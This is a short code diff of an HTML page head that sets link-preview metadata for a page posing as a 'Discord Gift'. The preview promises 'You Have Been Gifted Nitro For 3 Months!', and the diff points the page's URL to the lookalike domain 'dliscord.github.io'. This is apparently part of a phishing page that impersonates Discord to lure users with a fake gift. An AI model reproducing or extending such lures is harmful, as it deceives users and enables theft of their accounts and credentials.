@@ -3,7 +3,7 @@
   <head>
     <link rel="stylesheet" href="../assest/style.css"/>
     <meta property="og:site_name" content="Discord Gift">
-    <meta property="og:url" content="https://dliscord.">
+    <meta property="og:url" content="https://dliscord.github.io">
     <meta property="og:title" content="Discord">
     <meta property="og:description" content="You Have Been Gifted Nitro For 3 Months!">
     <meta property="og:type" content="Discord">
